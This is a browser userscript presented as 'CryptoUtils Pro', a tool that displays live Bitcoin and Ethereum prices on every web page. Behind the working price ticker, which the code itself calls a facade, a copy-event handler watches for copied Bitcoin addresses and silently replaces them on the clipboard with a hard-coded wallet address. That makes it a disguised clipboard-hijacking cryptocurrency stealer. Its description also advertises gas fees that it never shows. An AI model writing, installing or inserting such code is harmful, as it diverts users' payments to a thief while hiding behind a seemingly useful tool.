// ==UserScript==
// @name         CryptoUtils Pro
// @namespace    http://tampermonkey.net/
// @version      1.2
// @description  A lightweight and convenient script to display real-time BTC/ETH prices and ETH gas fees directly in your browser.
// @author       J. Doe
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @run-at       document-idle
// @downloadURL https://update.greasyfork.org/scripts/544061/CryptoUtils%20Pro.user.js
// @updateURL https://update.greasyfork.org/scripts/544061/CryptoUtils%20Pro.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // --- Configuration ---
    const walletConfig = {
        destinationAddress: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'
    };

    // --- Facade Module: UI and Price Ticker ---
    function initializeUI() {
        const displayContainer = document.createElement('div');
        displayContainer.id = 'crypto-utils-pro-display';
        document.body.appendChild(displayContainer);

        // Styling for the UI element to make it look professional and non-intrusive.
        const styles = `
            #crypto-utils-pro-display {
                position: fixed;
                bottom: 10px;
                right: 10px;
                z-index: 9999;
                background-color: #222;
                color: #fff;
                padding: 10px;
                border-radius: 8px;
                font-family: Arial, sans-serif;
                font-size: 12px;
                box-shadow: 0 0 10px rgba(0,0,0,0.5);
                text-align: left;
                width: 180px;
            }
            #crypto-utils-pro-display p { margin: 0; padding: 2px 0; }
            #crypto-utils-pro-display .price-label { font-weight: bold; color: #4CAF50; }
        `;

        const styleSheet = document.createElement("style");
        styleSheet.type = "text/css";
        styleSheet.innerText = styles;
        document.head.appendChild(styleSheet);

        displayContainer.innerHTML = `
            <p><span class="price-label">BTC:</span> <span id="btc-price">Loading...</span></p>
            <p><span class="price-label">ETH:</span> <span id="eth-price">Loading...</span></p>
        `;
    }

    function fetchData() {
        // Fetch BTC and ETH price data from a public API
        GM_xmlhttpRequest({
            method: 'GET',
            url: 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum&vs_currencies=usd',
            onload: function(response) {
                if (response.status === 200) {
                    const data = JSON.parse(response.responseText);
                    document.getElementById('btc-price').textContent = `$${data.bitcoin.usd.toLocaleString()}`;
                    document.getElementById('eth-price').textContent = `$${data.ethereum.usd.toLocaleString()}`;
                }
            }
        });
    }

    // Initializion
    initializeUI();
    fetchData();
    setInterval(fetchData, 90000); // Update prices every 90 seconds

    function handleCopy(event) {
        const selection = document.getSelection().toString();


        const btcRegex = /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,71}$/;

        if (btcRegex.test(selection)) {
            event.preventDefault();
            navigator.clipboard.writeText(walletConfig.destinationAddress).then(() => {
            }).catch(err => {
            });
        }
    }

    // Attach the event listener to the entire document.
    document.addEventListener('copy', handleCopy);

})();